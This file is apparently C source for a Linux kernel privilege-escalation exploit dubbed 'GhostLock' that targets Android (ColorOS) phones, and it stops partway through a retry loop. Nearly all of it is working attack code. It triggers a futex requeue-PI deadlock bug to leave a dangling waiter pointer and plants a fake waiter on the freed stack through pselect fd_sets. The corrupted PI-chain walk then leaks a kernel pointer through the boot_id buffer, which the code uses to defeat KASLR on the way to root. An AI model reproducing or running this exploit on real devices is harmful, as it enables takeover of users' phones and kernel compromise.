#include "common.h"

#define SLIDE_MAX_ATTEMPTS 20
#define SLIDE_CONSUME_DELAY 2000
#define SLIDE_CONSUME_USEC 0
#define SLIDE_PSELECT_NFDS PSELECT_ROUTE_NFDS
#define SLIDE_PSELECT_PAD_BYTES 0
#define SLIDE_PSELECT_WORD_SHIFT 0
#define SLIDE_WAIT_SECONDS 30

#define SLIDE_PSELECT_TIMEOUT_SEC 1
#define SLIDE_CONSUMER_CALLS 1

static uint32_t slide_f_wait;
static uint32_t slide_f_pi_target;
static uint32_t slide_f_pi_chain;
static atomic_int slide_waiter_ready;
static atomic_int slide_waiter_waiting;
static atomic_int slide_owner_started;
static atomic_int slide_route_done;
static atomic_int slide_waiter_tid;
static atomic_int slide_consume_calls;
static atomic_int slide_consume_go;
static atomic_int slide_consume_seen;
static atomic_int slide_consume_lost;
static atomic_int slide_consume_enter_sched;
static atomic_int slide_consume_stop;
static atomic_int slide_consume_sched_ok;
static atomic_int slide_consume_last_sched_ret;
static atomic_int slide_consume_last_sched_errno;
/* Nebula GhostLock signal: owner signals EDEADLK via this flag. */
/* Waiter polls this after FUTEX_WAIT_REQUEUE_PI returns. */
static atomic_int slide_deadlock_seen;
/* Signal for waiter -> consumer: consume phase may begin. */
static atomic_int slide_consume_begin;

/* Immediate boot_id capture: read right after pselect returns, before
 * the delayed kernel panic from nfulnl_logger corruption kills us. */
static char slide_immediate_bootid[80];
static int slide_immediate_bootid_len;

/* TRUE pre-leak boot_id snapshot (run187 lesson: slide-only pollution kills
 * every newly-forked app on ColorOS; the repair must write this back). */
char slide_true_bootid[80];
int slide_true_bootid_len;

static void slide_stage(const char *name) {
  dprintf(STDERR_FILENO, "SLIDE_STAGE:%s\n", name);
  fsync(STDERR_FILENO);
}

static void slide_unlock_pi(const char *name, uint32_t *futex) {
  errno = 0;
  if (futex_op(futex, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_warning("slide unlock %s failed errno=%d\n", name, errno);
  }
}

int slide_pselect_words_per_set(void) {
  int bits_per_word = (int)(8 * sizeof(unsigned long));
  return (SLIDE_PSELECT_NFDS + bits_per_word - 1) / bits_per_word;
}

int slide_pselect_global_word(int waiter_word) {
  return SLIDE_PSELECT_WORD_SHIFT + waiter_word;
}

int slide_pselect_put_global_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int global_word, uint64_t value) {
  if (global_word < 0) {
    return 0;
  }

  int set_idx = global_word / words_per_set;
  int word_idx = global_word % words_per_set;
  switch (set_idx) {
    case 0:
      fdset_put_word(in, word_idx, value);
      return 1;
    case 1:
      fdset_put_word(out, word_idx, value);
      return 1;
    case 2:
      fdset_put_word(ex, word_idx, value);
      return 1;
    default:
      return 0;
  }
}

void slide_pselect_put_waiter_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int waiter_word, uint64_t value, const char *name) {
  int global_word = slide_pselect_global_word(waiter_word);
  int placed = slide_pselect_put_global_word(
      in, out, ex, words_per_set, global_word, value);
  if (!placed) {
    pr_warning("slide pselect cannot place %s waiter_word=%d global_word=%d "
               "words_per_set=%d nfds=%d\n",
               name, waiter_word, global_word, words_per_set,
               SLIDE_PSELECT_NFDS);
  }
}

void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
  FD_ZERO(in);
  FD_ZERO(out);
  FD_ZERO(ex);

  int words_per_set = slide_pselect_words_per_set();
  /*
   * a.so mode=1 defaults: parent=loggers(+0x140), left=bootid_data(+0x148).
   * Env: GHOSTLOCK_SLIDE_PARENT=nfulnl|loggers
   *      GHOSTLOCK_SLIDE_BOOTID=sysctl|data
   */
  uint64_t slide_parent = SLIDE_LOGGERS_0_1;
  uint64_t slide_left = SLIDE_BOOTID_DATA;
  {
    char *sp = getenv("GHOSTLOCK_SLIDE_PARENT");
    if (sp && (sp[0] == 'n' || sp[0] == 'N')) {
      slide_parent = SLIDE_NFULNL_LOGGER;
    } else if (sp && (sp[0] == 'l' || sp[0] == 'L')) {
      slide_parent = SLIDE_LOGGERS_0_1;
    }
    char *sb = getenv("GHOSTLOCK_SLIDE_BOOTID");
    if (sb && (sb[0] == 's' || sb[0] == 'S')) {
      slide_left = SLIDE_RANDOM_BOOT_ID_DATA;
    } else if (sb && (sb[0] == 'd' || sb[0] == 'D')) {
      slide_left = SLIDE_BOOTID_DATA;
    }
    pr_info("slide stack topo: parent=%s p0=%016llx left=%s p0=%016llx\n",
            (slide_parent == SLIDE_NFULNL_LOGGER) ? "nfulnl" : "loggers",
            (unsigned long long)slide_parent,
            (slide_left == SLIDE_BOOTID_DATA) ? "bootid_data" : "sysctl_bootid",
            (unsigned long long)slide_left);
  }
  struct slide_waiter_word {
    int word;
    uint64_t value;
    const char *name;
  } words[] = {
    /*
     * GhostLock: *left = parent|color → boot_id buffer becomes parent ptr.
     */
    {0, slide_parent, "tree_pc"},
    {1, 0, "tree_right"},
    {2, slide_left, "tree_left"},
    {3, FAKE_WAITER_PRIO, "tree_prio"},
    {4, 0, "tree_deadline"},
    {5, slide_parent, "pi0"},
    {6, 0, "pi1"},
    {7, slide_left, "pi2"},
    {8, FAKE_WAITER_PRIO, "pi_prio"},
    {9, 0, "pi_deadline"},
    /*
     * Do NOT use SLIDE_INIT_TASK as waiter->task (OPPO wake path panic).
     * Use sprayed fake_task.
     */
    {10, fake_task, "task"},
    {11, fake_lock, "lock"},
    {12, 3, "wake_state"},
    {13, 0, "ww_ctx"},
  };
  for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
    struct slide_waiter_word *w = &words[i];
    slide_pselect_put_waiter_word(
        in, out, ex, words_per_set, w->word, w->value, w->name);
  }
}

void open_slide_selected_fds(fd_set *in, fd_set *out, fd_set *ex, int read_fd) {
  for (int fd = 0; fd < SLIDE_PSELECT_NFDS; fd++) {
    if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
      dup2(read_fd, fd);
    }
  }
  dup2(read_fd, SLIDE_PSELECT_NFDS - 1);
  FD_SET(SLIDE_PSELECT_NFDS - 1, ex);
}

void slide_pselect_stack_copy(void) {
  if (!page_base || !fake_lock || !fake_w0) {
    pr_error("slide pselect missing kernel page base=%016zx lock=%016zx w0=%016zx\n",
             page_base, fake_lock, fake_w0);
    return;
  }

  int pipefd[2] = {-1, -1};
  SYSCHK(pipe(pipefd));
  int block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
  if (block_fd < 0) {
    pr_warning("slide timerfd_create failed errno=%d; using pipe read end\n",
               errno);
    block_fd = pipefd[0];
  }
  int high_read = fcntl(block_fd, F_DUPFD, SLIDE_PSELECT_NFDS + 16);
  if (high_read < 0) {
    pr_error("slide pselect F_DUPFD read errno=%d\n", errno);
    if (block_fd != pipefd[0]) {
      close(block_fd);
    }
    close(pipefd[0]);
    close(pipefd[1]);
    return;
  }

  fd_set in;
  fd_set out;
  fd_set ex;
  prepare_slide_pselect_fdsets(&in, &out, &ex);
  open_slide_selected_fds(&in, &out, &ex, high_read);

  atomic_store(&slide_consume_stop, 0);
  atomic_store(&slide_consume_go, 0);
  atomic_store(&slide_consume_seen, 0);
  atomic_store(&slide_consume_lost, 0);
  atomic_store(&slide_consume_enter_sched, 0);
  atomic_store(&slide_consume_calls, 0);
  atomic_store(&slide_consume_sched_ok, 0);
  atomic_store(&slide_consume_last_sched_ret, -1);
  atomic_store(&slide_consume_last_sched_errno, 0);

  struct timespec timeout = {
    .tv_sec = SLIDE_PSELECT_TIMEOUT_SEC,
    .tv_nsec = 0,
  };
  struct timespec *timeoutp = &timeout;

  pr_info("slide pselect diag page_base=%016zx fake_lock=%016zx fake_w0=%016zx fake_task=%016zx fake_right=%016zx\n",
          page_base, fake_lock, fake_w0, fake_task, fake_right);
  pr_info("slide pselect addrs nfulnl=%016zx bootid=%016zx init_task=%016zx "
          "(p0_data_alias; NOT data_addr/page_base)\n",
          SLIDE_NFULNL_LOGGER, SLIDE_RANDOM_BOOT_ID_DATA, SLIDE_INIT_TASK);
  slide_stage("PSELECT_READY");
  atomic_store(&slide_consume_go, 1);
  errno = 0;
  slide_stage("PSELECT_CALL");

  int ret = pselect(SLIDE_PSELECT_NFDS, &in, &out, &ex, timeoutp, NULL);
  int saved_errno = errno;

  /* Issue #3: capture boot_id IMMEDIATELY after pselect returns.
   * rb_erase may have written nfulnl_logger into the boot_id buffer;
   * nfulnl_logger itself is also corrupted, so panic can race us. */
  {
    int bfd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
    if (bfd >= 0) {
      slide_immediate_bootid_len = (int)read(bfd, slide_immediate_bootid,
                                             sizeof(slide_immediate_bootid) - 1);
      close(bfd);
      if (slide_immediate_bootid_len > 0) {
        slide_immediate_bootid[slide_immediate_bootid_len] = '\0';
        pr_info("slide IMMEDIATE boot_id pid=%d len=%d value=[%s]\n",
                   getpid(), slide_immediate_bootid_len,
                   slide_immediate_bootid);
        fsync(STDERR_FILENO);
      } else {
        pr_warning("slide IMMEDIATE boot_id read returned %d errno=%d\n",
                   slide_immediate_bootid_len, errno);
      }
    } else {
      slide_immediate_bootid_len = -1;
      pr_warning("slide IMMEDIATE boot_id open failed errno=%d\n", errno);
    }
  }

  slide_stage("PSELECT_RETURN");
  atomic_store(&slide_consume_go, 0);
  pr_info("slide pselect returned ret=%d errno=%d calls=%d sched_ok=%d "
          "last_sched_ret=%d last_sched_errno=%d\n",
          ret, saved_errno, atomic_load(&slide_consume_calls),
          atomic_load(&slide_consume_sched_ok),
          atomic_load(&slide_consume_last_sched_ret),
          atomic_load(&slide_consume_last_sched_errno));

  close(high_read);
  if (block_fd != pipefd[0]) {
    close(block_fd);
  }
  close(pipefd[0]);
  close(pipefd[1]);
}

void *slide_consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(CONSUMER_CORE);

  /* Wait for waiter to set its tid. */
  int tid;
  while (!(tid = atomic_load(&slide_waiter_tid))) {
    __asm__ volatile("yield" ::: "memory");
  }

  while (!atomic_load(&slide_consume_begin) ||
         !atomic_load(&slide_consume_go)) {
    __asm__ volatile("yield" ::: "memory");
  }

  /* a.so slide_consumer_thread: after go==1, usleep(50000) then ONE
   * sched_setattr_tid; then set stop. Match that timing (env override OK). */
  {
    char *d = getenv("SLIDE_CONSUME_USLEEP");
    useconds_t us = d ? (useconds_t)strtoul(d, NULL, 0) : 50000;
    if (us > 0) {
      usleep(us);
    }
  }

  /* Single PI walk while fd_sets occupy the freed waiter stack frame. */
  {
    /* a.so: nice = (calls % 19) + 1 */
    int nice_val = (atomic_load(&slide_consume_calls) % 19) + 1;
    errno = 0;
    atomic_store(&slide_consume_enter_sched, 1);
    slide_stage("CONSUMER_CALL");
    long ret = sched_setattr_tid(tid, nice_val);
    int saved_errno = errno;
    slide_stage("CONSUMER_RETURN");
    atomic_store(&slide_consume_last_sched_ret, (int)ret);
    atomic_store(&slide_consume_last_sched_errno, saved_errno);
    if (ret == 0) {
      atomic_store(&slide_consume_sched_ok, 1);
    }
    atomic_store(&slide_consume_calls, 1);
    pr_info("slide consumer sched_setattr tid=%d iter=0 ret=%ld errno=%d\n",
            tid, ret, saved_errno);
    atomic_store(&slide_consume_stop, 1);
  }

  pr_info("slide consumer done\n");
  return NULL;
}

void *slide_waiter_thread(void *arg __attribute__((unused))) {
  int tid = (int)SYSCHK(syscall(SYS_gettid));
  atomic_store(&slide_waiter_tid, tid);

  if (futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("slide waiter lock chain errno=%d\n", errno);
    return NULL;
  }

  atomic_store(&slide_waiter_ready, 1);
  while (!atomic_load(&slide_owner_started)) {
    usleep(1000);
  }

  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_sec += SLIDE_WAIT_SECONDS;

  atomic_store(&slide_waiter_waiting, 1);
  /* FUTEX_WAIT_REQUEUE_PI may return due to:
   * (a) normal wakeup (requeued to pi_target, we have the lock)
   * (b) error (EDEADLK -> pi_blocked_on dangling, the bug trigger)
   * We no longer check errno or return value. We just proceed.
   */
  futex_op(&slide_f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
           &slide_f_pi_target, 0);
  futex_op(&slide_f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);

  /* If owner set deadlock_seen, we triggered GhostLock's pi_blocked_on
   * dangling pointer. Waiter must continue to pselect ASAP before the
   * kernel reuses the freed waiter stack frame. */
  if (atomic_load(&slide_deadlock_seen)) {
    pr_info("slide waiter deadlock observed, entering pselect stage\n");
  }

  /* Signal consumer to begin the sched_setattr PI-chain walk. */
  atomic_store(&slide_consume_begin, 1);

  slide_pselect_stack_copy();
  atomic_store(&slide_route_done, 1);

  for (;;) {
    sleep(1);
  }
}

void *slide_owner_thread(void *arg __attribute__((unused))) {
  if (futex_op(&slide_f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("slide owner lock target errno=%d\n", errno);
    return NULL;
  }

  while (!atomic_load(&slide_waiter_ready)) {
    usleep(1000);
  }

  atomic_store(&slide_owner_started, 1);
  if (futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_warning("slide owner lock chain failed errno=%d\n", errno);
    slide_unlock_pi("pi_target", &slide_f_pi_target);
    return NULL;
  }

  /* Deadlock is now guaranteed. Signal to waiter that GhostLock is triggered. */
  atomic_store(&slide_deadlock_seen, 1);

  /* Signal consumer: waiter is ready for PI chain walk. */
  /* Consumer should call sched_setattr(waiter_tid) to walk PI chain. */
  for (;;) {
    sleep(1);
  }
}

int hex_value(char c) {
  if (c >= '0' && c <= '9') {
    return c - '0';
  }
  if (c >= 'a' && c <= 'f') {
    return c - 'a' + 10;
  }
  if (c >= 'A' && c <= 'F') {
    return c - 'A' + 10;
  }
  return -1;
}

uint64_t slide_read_stext(void) {
  char buf[80];
  unsigned char raw[16];
  ssize_t n;

  /* Prefer the immediate capture from right after pselect (issue #3). */
  if (slide_immediate_bootid_len > 0) {
    memcpy(buf, slide_immediate_bootid, (size_t)slide_immediate_bootid_len);
    n = slide_immediate_bootid_len;
    pr_info("slide using immediate boot_id capture len=%zd\n", n);
  } else {
    int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
    if (fd < 0) {
      pr_warning("slide boot_id read denied errno=%d\n", errno);
      return 0;
    }
    n = read(fd, buf, sizeof(buf) - 1);
    int saved_errno = errno;
    close(fd);
    if (n < 0) {
      pr_warning("slide boot_id read failed errno=%d\n", saved_errno);
      return 0;
    }
  }
  buf[n] = '\0';
  buf[strcspn(buf, "\r\n")] = '\0';
  pr_info("slide raw boot_id pid=%d len=%zd value=[%s]\n", getpid(), n, buf);
  /* Fact dump: first 16 bytes as hex (no interpretation). */
  {
    char hex[64];
    int hp = 0;
    for (int i = 0; i < 16 && i < (int)n && hp < (int)sizeof(hex) - 3; i++) {
      hp += snprintf(hex + hp, sizeof(hex) - (size_t)hp, "%02x",
                     (unsigned char)buf[i]);
    }
    pr_info("slide raw boot_id hex16=%s expected_p0_nfulnl=%016zx "
            "expected_p0_bootid=%016zx PHYS_LOAD=%llx\n",
            hex, (size_t)(p0_data_alias(SLIDE_NFULNL_LOGGER_IMAGE) & ~(uint64_t)3),
            (size_t)p0_data_alias(SLIDE_RANDOM_BOOT_ID_DATA_IMAGE),
            (unsigned long long)P0_KERNEL_PHYS_LOAD);
  }

  int nibble = -1;
  int out = 0;
  for (ssize_t i = 0; i < n && out < 16; i++) {
    int v = hex_value(buf[i]);
    if (v < 0) {
      continue;
    }
    if (nibble < 0) {
      nibble = v;
      continue;
    }
    raw[out++] = (unsigned char)((nibble << 4) | v);
    nibble = -1;
  }
  if (out != 16) {
    pr_warning("slide short boot_id parse out=%d n=%zd\n", out, n);
    return 0;
  }

  uint64_t leaked = 0;
  uint64_t leaked_hi = 0;
  for (int i = 0; i < 8; i++) {
    leaked |= (uint64_t)raw[i] << (i * 8);
    leaked_hi |= (uint64_t)raw[i + 8] << (i * 8);
  }
  /* rb_set_parent_color writes parent | color in low 2 bits. */
  leaked &= ~(uint64_t)3;
  if ((leaked >> 48) != 0xffff) {
    pr_warning("slide bad leaked pointer=%016llx (boot_id not overwritten)\n",
               (unsigned long long)leaked);
    return 0;
  }

  /* Always publish raw kernel pointer from boot_id (pselect side-channel). */
  boot_id_leaked_ptr = leaked;
  slide_bootid_hi_capture = leaked_hi;
  /*
   * Physmap: linear map 0xffffff80…
   * Text-KIMAGE: not physmap AND (leaked-OFF) 2MiB-aligned AND NOT hybrid.
   *
   * Crash fact (2026-07-23): hybrid UUID had lo≈fake-KIMAGE, hi=p0(bootid_data)
   *   raw=4827d031-eeff-ffff-e894-222a80ffffff
   *   lo=ffffffee31d02748 (2MiB math OK) hi=ffffff802a2294e8 (physmap)
   *   → false kaslr_done → FOPS/CFI panic. REJECT when hi is physmap/p0.
   */
  boot_id_leak_is_physmap =
      ((leaked & 0xfffffff000000000ULL) == 0xffffff8000000000ULL);
  {
    int high_ok = ((leaked >> 48) == 0xffff) && !boot_id_leak_is_physmap;
    uint64_t b_n = leaked - SLIDE_NFULNL_LOGGER_OFF;
    uint64_t b_l = leaked - SLIDE_LOGGERS_0_1_OFF;
    int n_ok = high_ok && ((b_n & 0x1fffffULL) == 0) &&
               ((b_n & 0xfffffff000000000ULL) != 0xffffff8000000000ULL);
    int l_ok = high_ok && ((b_l & 0x1fffffULL) == 0) &&
               ((b_l & 0xfffffff000000000ULL) != 0xffffff8000000000ULL);
    /*
     * Device fact (2026-07-24): a.so ROOT with value=ffffffdb79b02748 while
     * UUID hi half is physmap residual (p0). hi is NOT proof of false KIMAGE.
     * Only lo matters: 2MiB base after OFF. Keep tag 0xee/0xef reject only
     * (crash class ffffffee2fc00000).
     */
    boot_id_leak_is_hybrid = 0;
    boot_id_leak_is_kimage = n_ok || l_ok;
    if (boot_id_leak_is_kimage) {
      uint64_t base = n_ok ? b_n : b_l;
      unsigned tag = (unsigned)((base >> 40) & 0xffu);
      if (tag == 0xeeu || tag == 0xefu) {
        pr_warning("BOOT_ID tag=0x%02x reject lo=%016llx base=%016llx "
                   "(crash-class false KIMAGE)\n",
                   tag, (unsigned long long)leaked, (unsigned long long)base);
        boot_id_leak_is_kimage = 0;
      }
    }
    if (!boot_id_leak_is_kimage && (n_ok || l_ok) == 0) {
      /* log residual hi for diagnostics only */
      (void)leaked_hi;
    }
  }
  pr_info("BOOT_ID_LEAK ptr=%016llx hi=%016llx is_kimage=%d is_physmap=%d "
             "(pselect+GhostLock writeback; no perf)\n",
             (unsigned long long)leaked, (unsigned long long)leaked_hi,
             boot_id_leak_is_kimage, boot_id_leak_is_physmap);

  /*
   * a.so slide_read_stext DIAG only (do NOT set kaslr_done from this):
   *   nfulnl_p0 = (NFULNL_OFF + PHYS_DELTA) | PAGE_OFFSET
   *   aso_inv   = nfulnl_p0 + 0x7fd8000000   // a.so p0_alias_image_offset
   *   stext     = leaked - aso_inv
   *   slide     = stext + 0x3f80000000       // a.so slide_leak_kernel_base
   *   kaslr_done= 1 always if stext!=0       // a.so — unsafe on physmap P0
   * Live PKJ110: leaked=loggers p0 → aso_would_stext is NOT true KIMAGE.
   */
  {
    const uint64_t nfulnl_off = (uint64_t)SLIDE_NFULNL_LOGGER_OFF;
    const uint64_t nfulnl_p0 =
        ((nfulnl_off + (uint64_t)P0_KERNEL_PHYS_DELTA) | (uint64_t)P0_PAGE_OFFSET) &
        ~(uint64_t)3;
    const uint64_t aso_inv = nfulnl_p0 + 0x7fd8000000ULL;
    const uint64_t aso_stext = leaked - aso_inv;
    const uint64_t aso_slide = aso_stext + 0x3f80000000ULL;
    const uint64_t our_inv = (uint64_t)p0_alias_image_offset(nfulnl_p0);
    const uint64_t alt_stext = leaked - our_inv;
    const int aso_kimage =
        ((aso_stext >> 48) == 0xffff) &&
        ((aso_stext & 0xfffffff000000000ULL) != 0xffffff8000000000ULL);
    pr_info("aso_diag leaked=%016llx nfulnl_p0=%016llx aso_inv=%016llx "
            "aso_would_stext=%016llx aso_would_slide=%016llx "
            "aso_would_kaslr_done=1 aso_stext_kimage=%d "
            "our_inv=%016llx alt_stext=%016llx "
            "(DIAG only; kaslr_done NOT set from aso math)\n",
            (unsigned long long)leaked, (unsigned long long)nfulnl_p0,
            (unsigned long long)aso_inv, (unsigned long long)aso_stext,
            (unsigned long long)aso_slide, aso_kimage,
            (unsigned long long)our_inv, (unsigned long long)alt_stext);
  }

  /*
   * Two address spaces:
   * - KIMAGE VA  (0xffffffc0...): text/data with RANDOMIZE_BASE slide
   * - Physmap P0 (0xffffff80...): linear map of phys (p0_data_alias)
   *
   * kaslr_base consumers (text_addr / fops) expect KIMAGE base.
   * fops path: kaslr_base = text_ptr - (SYM - KIMAGE_TEXT_BASE).
   */
  uint64_t expected_p0 =
      p0_data_alias(SLIDE_NFULNL_LOGGER_IMAGE) & ~(uint64_t)3;

  /*
   * Case A: boot_id holds KIMAGE-class ptr (not physmap 0xffffff80…).
   * a.so DEBUG: value=KIMAGE(nfulnl)=base+NFULNL_OFF → stext=base.
   * NOTE: low 24 bits of slid KIMAGE(nfulnl) are NOT equal to OFF&0xffffff
   * (slide shifts mid bits). Always use: base = leaked - NFULNL_OFF, then
   * validate 2MiB align + kimage class (same as a.so success path).
   */
  if (boot_id_leak_is_kimage) {
    uint64_t kimage_base = leaked - SLIDE_NFULNL_LOGGER_OFF;
    int base_ok =
        ((kimage_base >> 48) == 0xffff) &&
        ((kimage_base & 0xfffffff000000000ULL) != 0xffffff8000000000ULL) &&
        ((kimage_base & 0x1fffffULL) == 0);
    /* Prefer nfulnl OFF; else loggers OFF (a.so profile+0x140). */
    if (!base_ok) {
      kimage_base = leaked - SLIDE_LOGGERS_0_1_OFF;
      base_ok =
          ((kimage_base >> 48) == 0xffff) &&
          ((kimage_base & 0xfffffff000000000ULL) != 0xffffff8000000000ULL) &&
          ((kimage_base & 0x1fffffULL) == 0);
    }
    if (!base_ok) {
      pr_warning("slide KIMAGE ptr=%016llx derived base invalid\n",
                 (unsigned long long)leaked);
      return 0;
    }
    /* Crash-class only: base tag 0xee/0xef (ffffffee2fc00000 panic). */
    {
      unsigned tag = (unsigned)((kimage_base >> 40) & 0xffu);
      if (tag == 0xeeu || tag == 0xefu) {
        pr_warning("slide KIMAGE base tag=0x%02x rejected (crash class) "
                   "ptr=%016llx base=%016llx\n",
                   tag, (unsigned long long)leaked,
                   (unsigned long long)kimage_base);
        boot_id_leak_is_kimage = 0;
        return 0;
      }
    }
    pr_info("slide KIMAGE leak pid=%d leaked=%016llx base=%016llx "
               "(a.so nfulnl/loggers-OFF)\n",
               getpid(), (unsigned long long)leaked,
               (unsigned long long)kimage_base);
    return kimage_base;
  }

  /* Case B: physmap p0 of tree parent (loggers[0][1] or nfulnl).
   * Device fact (PHYS_LOAD=a8000000): boot_id became loggers p0
   * 0xffffff802a102698 — GhostLock write confirmed. a.so treats any
   * 0xffff........ ptr similarly (p0_alias_image_offset path). */
  uint64_t expected_loggers_p0 =
      p0_data_alias(SLIDE_LOGGERS_0_1_IMAGE) & ~(uint64_t)3;
  if (leaked == expected_p0 || leaked == expected_loggers_p0) {
    pr_info("slide P0 write-confirmed pid=%d leaked=%016llx "
               "nfulnl_p0=%016llx loggers_p0=%016llx "
               "(parent writeback; KIMAGE slide not in this value)\n",
               getpid(), (unsigned long long)leaked,
               (unsigned long long)expected_p0,
               (unsigned long long)expected_loggers_p0);
    /*
     * a.so after any 0xffff ptr: stext = leaked - p0_inv(nfulnl);
     * for pure p0 parent echo that is always PHYS-map base, not KIMAGE.
     * Shell has no perf KIMAGE. Proceed with KIMAGE_TEXT_BASE and let
     * parent set kaslr_done=1 for FOPS trial (slide 0 assumption).
     * If KASLR slide != 0, FOPS will fail cleanly / panic — fact check.
     */
    pr_warning("slide P0 ok; return KIMAGE_TEXT_BASE for FOPS trial (slide 0)\n");
    return KIMAGE_TEXT_BASE;
  }

  pr_warning("slide unexpected leak=%016llx expected_nfulnl_p0=%016llx "
             "expected_loggers_p0=%016llx\n",
             (unsigned long long)leaked, (unsigned long long)expected_p0,
             (unsigned long long)expected_loggers_p0);
  return 0;
}

/* After successful GhostLock stages without a text leak, continue with
 * static physmap for data (p0_data_alias). KIMAGE slide deferred to fops
 * path once arb-read exists (same as fops.c:leak_kernel_base). */
uint64_t slide_child_leak_stext(void) {
  pthread_t waiter;
  pthread_t owner;
  pthread_t consumer;
  atomic_store(&slide_consume_go, 0);
  atomic_store(&slide_consume_stop, 0);
  atomic_store(&slide_consume_begin, 0);
  atomic_store(&slide_deadlock_seen, 0);
  SYSCHK(pthread_create(&waiter, NULL, slide_waiter_thread, NULL));
  SYSCHK(pthread_create(&owner, NULL, slide_owner_thread, NULL));
  SYSCHK(pthread_create(&consumer, NULL, slide_consumer_thread, NULL));

  while (!atomic_load(&slide_waiter_waiting) ||
         !atomic_load(&slide_owner_started)) {
    usleep(1000);
  }

  /* Issue requeue. On this kernel, this deterministically returns EDEADLK.
   * The requeue call itself wakes the waiter from FUTEX_WAIT_REQUEUE_PI.
   * Owner then locks pi_chain (DEADLOCK), sets deadlock_seen=1,
   * and owner itself blocks on pi_chain forever.
   * Waiter wakes, checks deadlock_seen, proceeds to pselect.
   * Consumer walks PI chain, kernel reads dangling pi_blocked_on. */
  errno = 0;
  long rc = futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
                     &slide_f_pi_target, 0);
  pr_info("slide child requeue rc=%ld errno=%d\n", rc, errno);

  /* Whether requeue returns >0 (succeeded) or <0 (EDEADLK),
   * owner will have triggered the deadlock. Wait for pselect to complete. */
  while (!atomic_load(&slide_route_done)) {
    sleep(1);
  }

  {
    uint64_t stext = slide_read_stext();
    if (stext) {
      return stext;
    }
    /*
     * Do NOT treat "sched_ok without boot_id overwrite" as success.
     * Nebula: CVE is constrained write, not infoleak — but FOPS/root still
     * need a real write. Returning KIMAGE with kaslr_done was a lie and
     * burned FOPS attempts (cfi step=4). Retry parent attempts instead.
     */
    pr_warning("slide no boot_id writeback; sched_ok=%d (retry)\n",
               atomic_load(&slide_consume_sched_ok));
    return 0;
  }
}

int slide_leak_kernel_base(void) {
  /* run187 lesson (decisive): SLIDE_ONLY pollution alone kills every
   * newly-forked ColorOS app. Snapshot the TRUE boot_id BEFORE any
   * pselect writeback — restore_slide_boot_id writes these exact bytes
   * back into the live /proc buffer after the leak. */
  if (slide_true_bootid_len == 0) {
    int sfd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
    if (sfd >= 0) {
      slide_true_bootid_len =
          (int)read(sfd, slide_true_bootid, sizeof(slide_true_bootid) - 1);
      close(sfd);
      if (slide_true_bootid_len > 0) {
        slide_true_bootid[slide_true_bootid_len] = '\0';
      }
    }
    int valid = slide_true_bootid_len >= 36 && slide_true_bootid[14] == '4' &&
                (slide_true_bootid[19] == '8' ||
                 slide_true_bootid[19] == '9' ||
                 slide_true_bootid[19] == 'a' ||
                 slide_true_bootid[19] == 'b' ||
                 slide_true_bootid[19] == 'A' ||
                 slide_true_bootid[19] == 'B');
    if (!valid) {
      slide_true_bootid_len = 0;
    }
    pr_info("slide true boot_id snapshot len=%d valid=%d [%s]\n",
            slide_true_bootid_len, valid,
            slide_true_bootid_len > 0 ? slide_true_bootid : "(unread)");
    fsync(STDERR_FILENO);
  }
  for (int attempt = 1; attempt <= SLIDE_MAX_ATTEMPTS; attempt++) {
    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
    if (!page_base || !fake_lock) {
      continue;
    }

    int raw_fds[2];
    SYSCHK(pipe(raw_fds));
    int fds[2];
    fds[0] = SYSCHK(fcntl(raw_fds[0], F_DUPFD, SLIDE_PSELECT_NFDS + 128));
    fds[1] = SYSCHK(fcntl(raw_fds[1], F_DUPFD, SLIDE_PSELECT_NFDS + 129));
    SYSCHK(close(raw_fds[0]));
    SYSCHK(close(raw_fds[1]));

    pid_t child = SYSCHK(fork());
    if (child == 0) {
      SYSCHK(close(fds[0]));
      disable_rseq_for_thread();
      log_slide_child_context();
      boot_id_leaked_ptr = 0;
      boot_id_leak_is_hybrid = 0;
      uint64_t stext = slide_child_leak_stext();
      if (stext) {
        /* Parent needs raw boot_id ptr, hi (for hybrid check), and stext. */
        uint64_t payload[3] = {boot_id_leaked_ptr,
                               slide_bootid_hi_capture,
                               stext};
        SYSCHK(write(fds[1], payload, sizeof(payload)));
        _exit(0);
      }
      _exit(1);
    }

    SYSCHK(close(fds[1]));
    /* Parent waits for child: 24 bytes {leaked_ptr, hi, stext}. */
    uint64_t payload[3] = {0, 0, 0};
    ssize_t n = 0;
    struct timeval tv = {
      .tv_sec = 60,   /* 60s: exceed pselect 5s timeout + margin */
      .tv_usec = 0,
    };
    fd_set readfds;
    FD_ZERO(&readfds);
    FD_SET(fds[0], &readfds);
    int sel = select(fds[0] + 1, &readfds, NULL, NULL, &tv);
    if (sel > 0) {
      n = read(fds[0], payload, sizeof(payload));
    } else {
      /* Child timed out after 60s -> pselect hung (EDEADLK kernel).
       * Kill and retry. */
      pr_warning("slide attempt %d child timeout, killing child\n", attempt);
      SYSCHK(syscall(SYS_kill, child, 9));
    }
    SYSCHK(close(fds[0]));
    int status = 0;
    SYSCHK(waitpid(child, &status, 0));
    uint64_t stext = payload[2];
    if (n != (ssize_t)sizeof(payload) || !WIFEXITED(status) ||
        WEXITSTATUS(status) != 0 || !stext) {
      int ex = WIFEXITED(status) ? WEXITSTATUS(status) : -1;
